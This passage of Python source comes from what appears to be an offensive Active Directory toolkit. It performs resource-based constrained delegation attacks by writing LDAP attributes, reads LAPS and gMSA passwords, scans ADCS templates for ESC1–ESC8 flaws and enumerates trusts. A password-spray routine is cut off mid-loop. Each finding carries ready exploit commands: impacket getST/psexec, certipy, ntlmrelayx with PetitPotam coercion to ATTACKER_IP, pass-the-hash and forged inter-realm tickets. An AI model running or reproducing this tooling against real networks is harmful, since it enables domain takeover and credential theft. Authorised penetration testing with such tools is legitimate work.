            "computers_with_rbcd": rbcd_configured,
            "count": len(rbcd_configured),
            "exploit_cmd": (
                f"# After writing RBCD, use impacket to get a service ticket:\n"
                f"getST.py -spn cifs/TARGET.{domain} -impersonate Administrator "
                f"'{domain}/CONTROLLED$:password' -dc-ip {dc}\n"
                f"export KRB5CCNAME=Administrator.ccache\n"
                f"psexec.py -k -no-pass TARGET.{domain}"
            ),
        }

    elif action == "attack":
        if not target_computer:
            conn.unbind()
            return {"status": "error", "error": "target_computer is required for attack action"}
        if not controlled_sid:
            conn.unbind()
            return {"status": "error", "error": "controlled_sid is required (SID of computer you control)"}

        # Find target computer DN
        targets = _search(conn, base_dn,
                          f"(&(objectCategory=computer)(sAMAccountName={target_computer}))",
                          ["distinguishedName", "msDS-AllowedToActOnBehalfOfOtherIdentity"])
        if not targets:
            # Try with $ suffix
            targets = _search(conn, base_dn,
                              f"(&(objectCategory=computer)(sAMAccountName={target_computer}$))",
                              ["distinguishedName", "msDS-AllowedToActOnBehalfOfOtherIdentity"])
        if not targets:
            conn.unbind()
            return {"status": "error", "error": f"Computer '{target_computer}' not found"}

        target_dn = str(_get_entry_attr(targets[0], "distinguishedName", ""))

        # Build the security descriptor containing the controlled SID
        sd = _build_security_descriptor(controlled_sid)

        try:
            conn.modify(target_dn, {
                "msDS-AllowedToActOnBehalfOfOtherIdentity": [(MODIFY_REPLACE, [sd])]
            })
            success = conn.result.get("result", 1) == 0
            conn.unbind()
            return {
                "action": "attack",
                "target": target_computer,
                "target_dn": target_dn,
                "controlled_sid": controlled_sid,
                "success": success,
                "result": str(conn.result) if not success else "RBCD attribute written successfully",
                "exploit_cmd": (
                    f"# Now request service ticket as any user:\n"
                    f"getST.py -spn cifs/{target_computer}.{domain} -impersonate Administrator "
                    f"'{domain}/CONTROLLED$:password' -dc-ip {dc}\n"
                    f"export KRB5CCNAME=Administrator.ccache\n"
                    f"psexec.py -k -no-pass {target_computer}.{domain}"
                ),
            }
        except Exception as e:
            conn.unbind()
            return {"action": "attack", "success": False, "error": str(e)}

    elif action == "cleanup":
        if not target_computer:
            conn.unbind()
            return {"status": "error", "error": "target_computer is required for cleanup action"}

        targets = _search(conn, base_dn,
                          f"(&(objectCategory=computer)(sAMAccountName={target_computer}))",
                          ["distinguishedName"])
        if not targets:
            targets = _search(conn, base_dn,
                              f"(&(objectCategory=computer)(sAMAccountName={target_computer}$))",
                              ["distinguishedName"])
        if not targets:
            conn.unbind()
            return {"status": "error", "error": f"Computer '{target_computer}' not found"}

        target_dn = str(_get_entry_attr(targets[0], "distinguishedName", ""))
        try:
            conn.modify(target_dn, {
                "msDS-AllowedToActOnBehalfOfOtherIdentity": [(MODIFY_REPLACE, [])]
            })
            success = conn.result.get("result", 1) == 0
            conn.unbind()
            return {
                "action": "cleanup",
                "target": target_computer,
                "success": success,
                "result": "RBCD attribute cleared" if success else str(conn.result),
            }
        except Exception as e:
            conn.unbind()
            return {"action": "cleanup", "success": False, "error": str(e)}

    conn.unbind()
    return {"status": "error", "error": f"Unknown action '{action}'. Use: scan, attack, cleanup"}


def cmd_ad_delegation(dc: str, domain: str, username: str, password: str) -> dict:
    """Enumerate all delegation types: unconstrained, constrained, RBCD."""
    err = _require_ldap3()
    if err:
        return err

    if not dc:
        dc = _resolve_dc(domain)

    conn, base_dn = _ldap_connect(dc, domain, username, password)
    results = {"unconstrained": [], "constrained": [], "rbcd": []}

    # Unconstrained delegation (TrustedForDelegation, excluding DCs)
    uncon = _search(conn, base_dn,
                    "(&(userAccountControl:1.2.840.113556.1.4.803:=524288)"
                    "(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))",
                    ["sAMAccountName", "dNSHostName", "objectCategory", "distinguishedName"])
    for e in uncon:
        results["unconstrained"].append({
            "name": str(_get_entry_attr(e, "sAMAccountName", "")),
            "hostname": str(_get_entry_attr(e, "dNSHostName", "")),
            "dn": str(_get_entry_attr(e, "distinguishedName", "")),
            "attack": ("Unconstrained delegation: if you compromise this host, any user "
                       "authenticating to it leaves their TGT in memory. Use Rubeus "
                       "monitor or Mimikatz to extract and reuse TGTs. Coerce auth via "
                       "PrinterBug/PetitPotam to capture DC TGT."),
        })

    # Constrained delegation (msDS-AllowedToDelegateTo set)
    constrained = _search(conn, base_dn,
                          "(msDS-AllowedToDelegateTo=*)",
                          ["sAMAccountName", "dNSHostName", "msDS-AllowedToDelegateTo",
                           "userAccountControl", "distinguishedName"])
    for e in constrained:
        targets = [str(t) for t in _get_entry_attr_list(e, "msDS-AllowedToDelegateTo")]
        uac = int(_get_entry_attr(e, "userAccountControl", 0))
        protocol_transition = bool(uac & 0x1000000)  # TRUSTED_TO_AUTH_FOR_DELEGATION
        results["constrained"].append({
            "name": str(_get_entry_attr(e, "sAMAccountName", "")),
            "hostname": str(_get_entry_attr(e, "dNSHostName", "")),
            "targets": targets,
            "protocol_transition": protocol_transition,
            "dn": str(_get_entry_attr(e, "distinguishedName", "")),
            "attack": (f"Constrained delegation to {', '.join(targets)}. "
                       f"{'With protocol transition (S4U2Self+S4U2Proxy): can impersonate ANY user.' if protocol_transition else 'Without protocol transition: need a forwardable TGS from target user.'} "
                       f"Use getST.py -spn <target_spn> -impersonate Administrator"),
        })

    # RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity set)
    rbcd = _search(conn, base_dn,
                   "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)",
                   ["sAMAccountName", "dNSHostName", "msDS-AllowedToActOnBehalfOfOtherIdentity",
                    "distinguishedName"])
    for e in rbcd:
        results["rbcd"].append({
            "name": str(_get_entry_attr(e, "sAMAccountName", "")),
            "hostname": str(_get_entry_attr(e, "dNSHostName", "")),
            "dn": str(_get_entry_attr(e, "distinguishedName", "")),
            "attack": ("RBCD configured: a trusted principal can impersonate users to this "
                       "service. Check who is trusted via the SD blob. If you control the "
                       "trusted account, use getST.py for S4U2Self + S4U2Proxy."),
        })

    conn.unbind()
    return {
        "unconstrained_count": len(results["unconstrained"]),
        "constrained_count": len(results["constrained"]),
        "rbcd_count": len(results["rbcd"]),
        **results,
    }


def cmd_ad_adcs(dc: str, domain: str, username: str, password: str) -> dict:
    """Enumerate ADCS: CAs, templates, and check for ESC1-ESC8 vulnerabilities."""
    err = _require_ldap3()
    if err:
        return err

    if not dc:
        dc = _resolve_dc(domain)

    conn, base_dn = _ldap_connect(dc, domain, username, password)
    config_dn = f"CN=Configuration,{base_dn}"
    results = {"cas": [], "templates": [], "vulnerabilities": []}

    # Enumerate Certificate Authorities
    cas = _search(conn, config_dn,
                  "(objectClass=pKIEnrollmentService)",
                  ["cn", "dNSHostName", "cACertificate", "certificateTemplates",
                   "msPKI-Enrollment-Servers", "flags"])
    for ca in cas:
        ca_name = str(_get_entry_attr(ca, "cn", ""))
        ca_host = str(_get_entry_attr(ca, "dNSHostName", ""))
        templates = _get_entry_attr_list(ca, "certificateTemplates")
        enrollment_servers = _get_entry_attr_list(ca, "msPKI-Enrollment-Servers")
        ca_flags = _get_entry_attr(ca, "flags", 0)

        ca_info = {
            "name": ca_name,
            "hostname": ca_host,
            "templates": [str(t) for t in templates],
            "template_count": len(templates),
        }
        results["cas"].append(ca_info)

        # ESC6: check EDITF_ATTRIBUTESUBJECTALTNAME2 flag (0x00000040 in ICertAdmin flags)
        try:
            flag_val = int(ca_flags) if ca_flags else 0
            if flag_val & 0x00000040:
                results["vulnerabilities"].append({
                    "type": "ESC6",
                    "ca": ca_name,
                    "description": "EDITF_ATTRIBUTESUBJECTALTNAME2 enabled on CA -- any template can specify a SAN",
                    "severity": "HIGH",
                    "exploit_cmd": (
                        f"certipy req -ca '{ca_name}' -username '{username}@{domain}' "
                        f"-password '{password}' -target '{ca_host}' "
                        f"-template User -upn administrator@{domain}"
                    ),
                })
        except (ValueError, TypeError):
            pass

        # ESC8: check for HTTP enrollment endpoints
        for srv in enrollment_servers:
            srv_str = str(srv)
            if "http" in srv_str.lower():
                results["vulnerabilities"].append({
                    "type": "ESC8",
                    "ca": ca_name,
                    "endpoint": srv_str,
                    "description": "HTTP enrollment endpoint (Web Enrollment) -- relay NTLM auth to enroll certificates",
                    "severity": "HIGH",
                    "exploit_cmd": (
                        f"# Relay NTLM to ADCS web enrollment:\n"
                        f"ntlmrelayx.py -t http://{ca_host}/certsrv/certfnsh.asp "
                        f"-smb2support --adcs --template DomainController\n"
                        f"# Coerce auth: PetitPotam.py {dc} ATTACKER_IP"
                    ),
                })

    # Also check for HTTP enrollment via well-known paths
    for ca_entry in results["cas"]:
        try:
            ca_host = ca_entry["hostname"]
            if ca_host:
                results["vulnerabilities"].append({
                    "type": "ESC8_CHECK",
                    "ca": ca_entry["name"],
                    "description": f"Verify HTTP enrollment at http://{ca_host}/certsrv/",
                    "severity": "INFO",
                    "exploit_cmd": f"curl -I http://{ca_host}/certsrv/",
                })
        except Exception:
            pass

    # Enumerate certificate templates
    template_entries = _search(conn, config_dn,
                               "(objectClass=pKICertificateTemplate)",
                               ["cn", "displayName", "msPKI-Certificate-Name-Flag",
                                "msPKI-Enrollment-Flag", "pKIExtendedKeyUsage",
                                "msPKI-RA-Signature", "msPKI-Certificate-Application-Policy",
                                "nTSecurityDescriptor", "msPKI-Template-Schema-Version"],
                               controls=[security_descriptor_control(sdflags=0x04)])

    for tmpl in template_entries:
        tmpl_name = str(_get_entry_attr(tmpl, "cn", ""))
        display_name = str(_get_entry_attr(tmpl, "displayName", tmpl_name))
        name_flag = int(_get_entry_attr(tmpl, "msPKI-Certificate-Name-Flag", 0) or 0)
        enrollment_flag = int(_get_entry_attr(tmpl, "msPKI-Enrollment-Flag", 0) or 0)
        ekus = _get_entry_attr_list(tmpl, "pKIExtendedKeyUsage")
        ra_sig = int(_get_entry_attr(tmpl, "msPKI-RA-Signature", 0) or 0)
        app_policies = _get_entry_attr_list(tmpl, "msPKI-Certificate-Application-Policy")
        schema_ver = int(_get_entry_attr(tmpl, "msPKI-Template-Schema-Version", 1) or 1)

        eku_names = [EKU_OIDS.get(str(e), str(e)) for e in ekus]

        tmpl_info = {
            "name": tmpl_name,
            "display_name": display_name,
            "ekus": eku_names,
            "enrollee_supplies_subject": bool(name_flag & 0x00000001),
            "ra_signatures_required": ra_sig,
            "schema_version": schema_ver,
        }
        results["templates"].append(tmpl_info)

        # ESC1: enrollee supplies subject + client auth EKU
        has_client_auth = any(eku in ["Client Authentication", "PKINIT Client Authentication",
                                      "Smart Card Logon", "Any Purpose"]
                             for eku in eku_names)
        enrollee_supplies_subject = bool(name_flag & 0x00000001)  # CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT

        if enrollee_supplies_subject and has_client_auth and ra_sig == 0:
            results["vulnerabilities"].append({
                "type": "ESC1",
                "template": tmpl_name,
                "description": f"Template '{tmpl_name}' allows enrollee to supply subject AND has client auth EKU",
                "severity": "CRITICAL",
                "ekus": eku_names,
                "exploit_cmd": (
                    f"certipy req -ca '<CA_NAME>' -username '{username}@{domain}' "
                    f"-password '{password}' -target '{dc}' "
                    f"-template '{tmpl_name}' -upn administrator@{domain}"
                ),
            })

        # ESC2: Any Purpose EKU or no EKU defined
        has_any_purpose = "Any Purpose" in eku_names
        no_eku = len(ekus) == 0

        if (has_any_purpose or no_eku) and ra_sig == 0 and not enrollee_supplies_subject:
            results["vulnerabilities"].append({
                "type": "ESC2",
                "template": tmpl_name,
                "description": f"Template '{tmpl_name}' has {'Any Purpose EKU' if has_any_purpose else 'no EKU restrictions'}",
                "severity": "HIGH",
                "exploit_cmd": (
                    f"certipy req -ca '<CA_NAME>' -username '{username}@{domain}' "
                    f"-password '{password}' -target '{dc}' -template '{tmpl_name}'"
                ),
            })

        # ESC3: Certificate Request Agent template
        has_enrollment_agent = any(eku in ["Certificate Request Agent"] for eku in eku_names)
        if has_enrollment_agent and ra_sig == 0:
            results["vulnerabilities"].append({
                "type": "ESC3",
                "template": tmpl_name,
                "description": f"Template '{tmpl_name}' allows enrollment agent certificates",
                "severity": "HIGH",
                "exploit_cmd": (
                    f"# Step 1: Request enrollment agent cert\n"
                    f"certipy req -ca '<CA_NAME>' -username '{username}@{domain}' "
                    f"-password '{password}' -target '{dc}' -template '{tmpl_name}'\n"
                    f"# Step 2: Use it to request cert on behalf of another user\n"
                    f"certipy req -ca '<CA_NAME>' -username '{username}@{domain}' "
                    f"-password '{password}' -target '{dc}' -template User "
                    f"-on-behalf-of '{domain}\\administrator' -pfx enrollment_agent.pfx"
                ),
            })

        # ESC4: check if low-priv users have write access to template object
        sd_raw = _get_entry_attr(tmpl, "nTSecurityDescriptor")
        if sd_raw and isinstance(sd_raw, bytes):
            try:
                aces = _parse_sd_dacl(sd_raw)
                for ace in aces:
                    ace_mask = ace.get("mask", 0)
                    ace_sid = ace.get("sid", "")
                    # Check for GenericAll, GenericWrite, WriteDACL, WriteOwner from common low-priv SIDs
                    # S-1-5-11 = Authenticated Users, S-1-1-0 = Everyone, S-1-5-32-545 = Users
                    low_priv_sids = ["S-1-5-11", "S-1-1-0", "S-1-5-32-545"]
                    if ace_sid in low_priv_sids:
                        dangerous = ace_mask & (0x10000000 | 0x40000000 | 0x00040000 | 0x00080000)
                        if dangerous:
                            results["vulnerabilities"].append({
                                "type": "ESC4",
                                "template": tmpl_name,
                                "description": f"Low-privilege SID ({ace_sid}) has write access to template '{tmpl_name}'",
                                "severity": "HIGH",
                                "sid": ace_sid,
                                "exploit_cmd": (
                                    f"# Modify the template to be vulnerable to ESC1, then exploit:\n"
                                    f"certipy template -username '{username}@{domain}' "
                                    f"-password '{password}' -template '{tmpl_name}' "
                                    f"-target '{dc}' -save-old"
                                ),
                            })
                            break  # One finding per template is enough
            except Exception:
                pass

    conn.unbind()

    vuln_summary = {}
    for v in results["vulnerabilities"]:
        vtype = v["type"]
        vuln_summary[vtype] = vuln_summary.get(vtype, 0) + 1

    results["vulnerability_summary"] = vuln_summary
    results["total_vulnerabilities"] = len(results["vulnerabilities"])
    return results


def cmd_ad_laps(dc: str, domain: str, username: str, password: str,
                target_computer: str = "") -> dict:
    """Read LAPS passwords (v1 ms-Mcs-AdmPwd and v2 msLAPS-Password)."""
    err = _require_ldap3()
    if err:
        return err

    if not dc:
        dc = _resolve_dc(domain)

    conn, base_dn = _ldap_connect(dc, domain, username, password)

    if target_computer:
        comp_filter = f"(&(objectCategory=computer)(sAMAccountName={target_computer}))"
        if not target_computer.endswith("$"):
            comp_filter = (f"(|(&(objectCategory=computer)(sAMAccountName={target_computer}))"
                           f"(&(objectCategory=computer)(sAMAccountName={target_computer}$)))")
    else:
        comp_filter = "(objectCategory=computer)"

    # LAPS v1 and v2 attributes
    laps_attrs = [
        "cn", "sAMAccountName", "dNSHostName", "operatingSystem",
        "ms-Mcs-AdmPwd", "ms-Mcs-AdmPwdExpirationTime",
        "msLAPS-Password", "msLAPS-EncryptedPassword", "msLAPS-PasswordExpirationTime",
    ]

    entries = _search(conn, base_dn, comp_filter, laps_attrs)

    computers_with_laps = []
    readable_passwords = []

    for e in entries:
        comp_name = str(_get_entry_attr(e, "cn", ""))
        hostname = str(_get_entry_attr(e, "dNSHostName", ""))
        os_info = str(_get_entry_attr(e, "operatingSystem", ""))

        laps_v1_pwd = _get_entry_attr(e, "ms-Mcs-AdmPwd")
        laps_v1_exp = _get_entry_attr(e, "ms-Mcs-AdmPwdExpirationTime")
        laps_v2_pwd = _get_entry_attr(e, "msLAPS-Password")
        laps_v2_enc = _get_entry_attr(e, "msLAPS-EncryptedPassword")
        laps_v2_exp = _get_entry_attr(e, "msLAPS-PasswordExpirationTime")

        has_laps = bool(laps_v1_pwd or laps_v2_pwd or laps_v2_enc)
        # Even if password is not readable, the expiration time hints at LAPS being deployed
        laps_deployed = has_laps or bool(laps_v1_exp or laps_v2_exp)

        if not laps_deployed:
            continue

        entry_info = {
            "computer": comp_name,
            "hostname": hostname,
            "os": os_info,
            "laps_deployed": laps_deployed,
            "laps_v1_password": str(laps_v1_pwd) if laps_v1_pwd else None,
            "laps_v1_expiration": _filetime_to_str(laps_v1_exp) if laps_v1_exp else None,
            "laps_v2_password": str(laps_v2_pwd) if laps_v2_pwd else None,
            "laps_v2_encrypted": bool(laps_v2_enc),
            "laps_v2_expiration": _filetime_to_str(laps_v2_exp) if laps_v2_exp else None,
            "password_readable": bool(laps_v1_pwd or laps_v2_pwd),
        }
        computers_with_laps.append(entry_info)

        if laps_v1_pwd or laps_v2_pwd:
            readable_passwords.append({
                "computer": comp_name,
                "hostname": hostname,
                "password": str(laps_v1_pwd or laps_v2_pwd),
                "version": "v1" if laps_v1_pwd else "v2",
            })

    conn.unbind()

    return {
        "computers_with_laps": len(computers_with_laps),
        "readable_passwords": len(readable_passwords),
        "entries": computers_with_laps,
        "passwords": readable_passwords,
        "exploit_cmd": (
            f"# Use recovered LAPS password to authenticate:\n"
            f"crackmapexec smb TARGET -u Administrator -p 'LAPS_PASSWORD' --local-auth\n"
            f"psexec.py 'Administrator:LAPS_PASSWORD@TARGET'"
        ),
    }


def cmd_ad_shadow_creds(dc: str, domain: str, username: str, password: str,
                        target: str = "", action: str = "read") -> dict:
    """Shadow Credentials: read/write/clear msDS-KeyCredentialLink."""
    err = _require_ldap3()
    if err:
        return err

    if not target:
        return {"status": "error", "error": "target parameter is required (sAMAccountName of target)"}

    if not dc:
        dc = _resolve_dc(domain)

    conn, base_dn = _ldap_connect(dc, domain, username, password)

    # Find target object
    entries = _search(conn, base_dn,
                      f"(sAMAccountName={target})",
                      ["distinguishedName", "msDS-KeyCredentialLink", "objectClass"])
    if not entries:
        conn.unbind()
        return {"status": "error", "error": f"Target '{target}' not found"}

    target_dn = str(_get_entry_attr(entries[0], "distinguishedName", ""))
    current_keys = _get_entry_attr_list(entries[0], "msDS-KeyCredentialLink")

    if action == "read":
        conn.unbind()
        return {
            "action": "read",
            "target": target,
            "target_dn": target_dn,
            "key_credentials": [str(k) for k in current_keys],
            "count": len(current_keys),
        }

    elif action == "write":
        # Generate a self-signed certificate for the key credential
        # This requires building a KeyCredential structure (DN-Binary format)
        # Recommend using pywhisker or certipy for full implementation
        conn.unbind()
        return {
            "action": "write",
            "target": target,
            "target_dn": target_dn,
            "note": ("Writing shadow credentials requires generating a KeyCredential "
                     "structure with an embedded certificate. Use dedicated tooling:"),
            "exploit_cmd": (
                f"# Using pywhisker:\n"
                f"pywhisker -d '{domain}' -u '{username}' -p '{password}' "
                f"--target '{target}' --action add --dc-ip {dc}\n"
                f"# Using certipy:\n"
                f"certipy shadow auto -username '{username}@{domain}' "
                f"-password '{password}' -account '{target}' -target {dc}\n"
                f"# Then authenticate with the generated certificate:\n"
                f"certipy auth -pfx '{target}.pfx' -dc-ip {dc}"
            ),
            "current_keys": len(current_keys),
        }

    elif action == "clear":
        try:
            conn.modify(target_dn, {
                "msDS-KeyCredentialLink": [(MODIFY_REPLACE, [])]
            })
            success = conn.result.get("result", 1) == 0
            conn.unbind()
            return {
                "action": "clear",
                "target": target,
                "target_dn": target_dn,
                "success": success,
                "result": "msDS-KeyCredentialLink cleared" if success else str(conn.result),
                "keys_removed": len(current_keys),
            }
        except Exception as e:
            conn.unbind()
            return {"action": "clear", "success": False, "error": str(e)}

    conn.unbind()
    return {"status": "error", "error": f"Unknown action '{action}'. Use: read, write, clear"}


def cmd_ad_gmsa(dc: str, domain: str, username: str, password: str) -> dict:
    """Find and extract Group Managed Service Account passwords."""
    err = _require_ldap3()
    if err:
        return err

    if not dc:
        dc = _resolve_dc(domain)

    conn, base_dn = _ldap_connect(dc, domain, username, password)

    # Find gMSA accounts
    gmsa_entries = _search(conn, base_dn,
                           "(objectClass=msDS-GroupManagedServiceAccount)",
                           ["sAMAccountName", "distinguishedName", "msDS-ManagedPassword",
                            "msDS-ManagedPasswordId", "msDS-ManagedPasswordInterval",
                            "msDS-GroupMSAMembership", "servicePrincipalName",
                            "memberOf", "description"])

    accounts = []
    for e in gmsa_entries:
        name = str(_get_entry_attr(e, "sAMAccountName", ""))
        dn = str(_get_entry_attr(e, "distinguishedName", ""))
        managed_pwd = _get_entry_attr(e, "msDS-ManagedPassword")
        pwd_interval = _get_entry_attr(e, "msDS-ManagedPasswordInterval", "unknown")
        spns = [str(s) for s in _get_entry_attr_list(e, "servicePrincipalName")]
        groups = [str(g) for g in _get_entry_attr_list(e, "memberOf")]

        account_info = {
            "name": name,
            "dn": dn,
            "spns": spns,
            "member_of": groups,
            "password_interval_days": str(pwd_interval),
            "description": str(_get_entry_attr(e, "description", "")),
            "password_readable": False,
            "nt_hash": None,
        }

        # Parse msDS-ManagedPassword blob to extract NT hash
        if managed_pwd and isinstance(managed_pwd, bytes) and len(managed_pwd) >= 16:
            try:
                nt_hash = _parse_gmsa_password(managed_pwd)
                if nt_hash:
                    account_info["password_readable"] = True
                    account_info["nt_hash"] = nt_hash
            except Exception:
                pass

        accounts.append(account_info)

    conn.unbind()

    readable = [a for a in accounts if a["password_readable"]]

    return {
        "gmsa_accounts": len(accounts),
        "readable_passwords": len(readable),
        "accounts": accounts,
        "exploit_cmd": (
            f"# If you can read the gMSA password, use the NT hash for pass-the-hash:\n"
            f"crackmapexec smb {dc} -u 'GMSA_ACCOUNT$' -H 'NT_HASH'\n"
            f"# Or with impacket:\n"
            f"getTGT.py '{domain}/GMSA_ACCOUNT$' -hashes ':NT_HASH' -dc-ip {dc}\n"
            f"# To dump gMSA password with gMSADumper:\n"
            f"gMSADumper.py -u '{username}' -p '{password}' -d '{domain}'"
        ),
    }


def _parse_gmsa_password(blob: bytes) -> str:
    """Parse MSDS-MANAGEDPASSWORD_BLOB to extract the NT hash.
    Blob format: Version(2) + Reserved(2) + Length(4) + CurrentPasswordOffset(2) + ..."""
    if len(blob) < 16:
        return ""
    try:
        # The blob starts with a header, then the current password data
        # Version (2 bytes) + Reserved (2 bytes) + Length (4 bytes) +
        # CurrentPasswordOffset (2 bytes)
        current_offset = struct.unpack("<H", blob[8:10])[0]
        if current_offset == 0 or current_offset >= len(blob):
            # Try treating the entire blob as the password
            password_bytes = blob
        else:
            password_bytes = blob[current_offset:]

        # The password is a UTF-16LE encoded string; compute its NT hash (MD4 of UTF-16LE)
        nt_hash = hashlib.new("md4", password_bytes).hexdigest()
        return nt_hash
    except Exception:
        return ""


def cmd_ad_trusts(dc: str, domain: str, username: str, password: str) -> dict:
    """Enumerate domain and forest trusts with detailed attributes."""
    err = _require_ldap3()
    if err:
        return err

    if not dc:
        dc = _resolve_dc(domain)

    conn, base_dn = _ldap_connect(dc, domain, username, password)

    trusts = _search(conn, base_dn,
                     "(objectClass=trustedDomain)",
                     ["cn", "trustDirection", "trustType", "trustAttributes",
                      "trustPartner", "flatName", "securityIdentifier",
                      "whenCreated", "whenChanged"])

    trust_list = []
    for t in trusts:
        direction = int(_get_entry_attr(t, "trustDirection", 0))
        ttype = int(_get_entry_attr(t, "trustType", 0))
        tattrs = int(_get_entry_attr(t, "trustAttributes", 0))
        attr_flags = [name for bit, name in TRUST_ATTRIBUTES.items() if tattrs & bit]

        raw_sid = _get_entry_attr(t, "securityIdentifier")
        trust_sid = _sid_to_str(raw_sid) if raw_sid and isinstance(raw_sid, bytes) else str(raw_sid or "")

        is_forest = bool(tattrs & 0x00000008)
        is_within_forest = bool(tattrs & 0x00000020)
        sid_filtering = bool(tattrs & 0x00000004)

        # Determine trust relationship type
        if is_within_forest:
            relationship = "Parent-Child or Tree-Root (within forest)"
        elif is_forest:
            relationship = "Forest trust"
        elif ttype == 3:
            relationship = "MIT Kerberos realm trust"
        else:
            relationship = "External trust"

        attack_notes = []
        if not sid_filtering:
            attack_notes.append("SID filtering DISABLED -- SID history injection possible (Golden ticket with extra SIDs)")
        if direction in (1, 3):
            attack_notes.append("Inbound trust: users from trusted domain can access resources here")
        if direction in (2, 3):
            attack_notes.append("Outbound trust: our users can access resources in trusted domain")
        if is_within_forest:
            attack_notes.append("Intra-forest: compromise of any domain = compromise of entire forest (no SID filtering by default)")

        trust_list.append({
            "name": str(_get_entry_attr(t, "cn", "")),
            "partner": str(_get_entry_attr(t, "trustPartner", "")),
            "flat_name": str(_get_entry_attr(t, "flatName", "")),
            "sid": trust_sid,
            "direction": TRUST_DIRECTION.get(direction, str(direction)),
            "type": TRUST_TYPE.get(ttype, str(ttype)),
            "relationship": relationship,
            "attributes": attr_flags,
            "sid_filtering": sid_filtering,
            "forest_trust": is_forest,
            "within_forest": is_within_forest,
            "created": str(_get_entry_attr(t, "whenCreated", "")),
            "modified": str(_get_entry_attr(t, "whenChanged", "")),
            "attack_notes": attack_notes,
        })

    conn.unbind()

    return {
        "trust_count": len(trust_list),
        "trusts": trust_list,
        "exploit_cmd": (
            f"# Cross-trust attacks with impacket:\n"
            f"# 1. Get trust key: secretsdump.py '{domain}/{username}:{password}@{dc}'\n"
            f"# 2. Forge inter-realm TGT:\n"
            f"ticketer.py -nthash TRUST_KEY -domain-sid CURRENT_SID "
            f"-extra-sid TRUSTED_SID-519 -domain {domain} administrator\n"
            f"# 3. Use the ticket:\n"
            f"export KRB5CCNAME=administrator.ccache\n"
            f"psexec.py -k -no-pass TRUSTED_DC"
        ),
    }


def cmd_ad_passwords(dc: str, domain: str, username: str, password: str,
                     action: str = "policy", spray_password: str = "",
                     spray_users: list = None) -> dict:
    """Get password policy or perform lockout-aware password spray."""
    err = _require_ldap3()
    if err:
        return err

    if not dc:
        dc = _resolve_dc(domain)

    conn, base_dn = _ldap_connect(dc, domain, username, password)

    if action == "policy":
        # Get default domain password policy
        policy = _search(conn, base_dn,
                         "(objectClass=domain)",
                         ["minPwdLength", "maxPwdAge", "minPwdAge", "pwdHistoryLength",
                          "lockoutThreshold", "lockoutDuration", "lockoutObservationWindow",
                          "pwdProperties"],
                         page_size=1)

        default_policy = {}
        if policy:
            p = policy[0]
            pwd_props = int(_get_entry_attr(p, "pwdProperties", 0))
            default_policy = {
                "min_password_length": int(_get_entry_attr(p, "minPwdLength", 0)),
                "max_password_age": _filetime_to_str(abs(int(_get_entry_attr(p, "maxPwdAge", 0) or 0))),
                "min_password_age": _filetime_to_str(abs(int(_get_entry_attr(p, "minPwdAge", 0) or 0))),
                "password_history_length": int(_get_entry_attr(p, "pwdHistoryLength", 0)),
                "lockout_threshold": int(_get_entry_attr(p, "lockoutThreshold", 0)),
                "lockout_duration_raw": str(_get_entry_attr(p, "lockoutDuration", "")),
                "lockout_observation_window_raw": str(_get_entry_attr(p, "lockoutObservationWindow", "")),
                "complexity_required": bool(pwd_props & 1),
                "reversible_encryption": bool(pwd_props & 16),
            }
            # Convert lockout duration from FILETIME interval to minutes
            try:
                lockout_raw = abs(int(_get_entry_attr(p, "lockoutDuration", 0) or 0))
                if lockout_raw > 0:
                    default_policy["lockout_duration_minutes"] = lockout_raw // 600000000
                else:
                    default_policy["lockout_duration_minutes"] = "Until admin unlock"
            except (ValueError, TypeError):
                default_policy["lockout_duration_minutes"] = "unknown"

            try:
                obs_raw = abs(int(_get_entry_attr(p, "lockoutObservationWindow", 0) or 0))
                if obs_raw > 0:
                    default_policy["observation_window_minutes"] = obs_raw // 600000000
            except (ValueError, TypeError):
                pass

        # Fine-grained password policies (PSOs)
        pso_entries = _search(conn, base_dn,
                              "(objectClass=msDS-PasswordSettings)",
                              ["cn", "msDS-PasswordSettingsPrecedence", "msDS-MinimumPasswordLength",
                               "msDS-LockoutThreshold", "msDS-LockoutObservationWindow",
                               "msDS-LockoutDuration", "msDS-PasswordComplexityEnabled",
                               "msDS-PasswordHistoryLength", "msDS-MaximumPasswordAge",
                               "msDS-PSOAppliesTo"])

        fine_grained = []
        for pso in pso_entries:
            applies_to = [str(a) for a in _get_entry_attr_list(pso, "msDS-PSOAppliesTo")]
            fine_grained.append({
                "name": str(_get_entry_attr(pso, "cn", "")),
                "precedence": int(_get_entry_attr(pso, "msDS-PasswordSettingsPrecedence", 0)),
                "min_length": int(_get_entry_attr(pso, "msDS-MinimumPasswordLength", 0) or 0),
                "lockout_threshold": int(_get_entry_attr(pso, "msDS-LockoutThreshold", 0) or 0),
                "complexity": bool(_get_entry_attr(pso, "msDS-PasswordComplexityEnabled", False)),
                "history_length": int(_get_entry_attr(pso, "msDS-PasswordHistoryLength", 0) or 0),
                "applies_to": applies_to,
            })

        conn.unbind()

        threshold = default_policy.get("lockout_threshold", 0)
        if threshold == 0:
            spray_note = "Safe to spray (no lockout policy)."
        else:
            spray_note = f"Stay below {threshold} attempts per observation window."

        return {
            "action": "policy",
            "default_policy": default_policy,
            "fine_grained_policies": fine_grained,
            "spray_guidance": f"Lockout threshold: {threshold}. {spray_note}",
        }

    elif action == "spray":
        if not spray_password:
            conn.unbind()
            return {"status": "error", "error": "spray_password is required for spray action"}

        # Get lockout policy first for safety
        policy = _search(conn, base_dn, "(objectClass=domain)",
                         ["lockoutThreshold", "lockoutObservationWindow"], page_size=1)
        lockout_threshold = 0
        if policy:
            lockout_threshold = int(_get_entry_attr(policy[0], "lockoutThreshold", 0))

        # If no user list provided, enumerate all enabled users
        if not spray_users:
            user_entries = _search(conn, base_dn,
                                   "(&(objectCategory=person)(objectClass=user)"
                                   "(!(userAccountControl:1.2.840.113556.1.4.803:=2)))",
                                   ["sAMAccountName"])
            spray_users = [str(_get_entry_attr(u, "sAMAccountName", "")) for u in user_entries]
            spray_users = [u for u in spray_users if u]

        conn.unbind()

        if lockout_threshold > 0 and lockout_threshold <= 3:
            return {
                "action": "spray",
                "warning": f"Lockout threshold is {lockout_threshold} -- spraying is risky!",
                "lockout_threshold": lockout_threshold,
                "aborted": True,
                "user_count": len(spray_users),
            }

        valid_creds = []
        errors = []
        tested = 0

        for target_user in spray_users:
            tested += 1
            try:
                test_server = Server(dc, port=389, use_ssl=False, connect_timeout=5)
                test_conn = Connection(test_server,
                                       user=f"{domain}\\{target_user}",
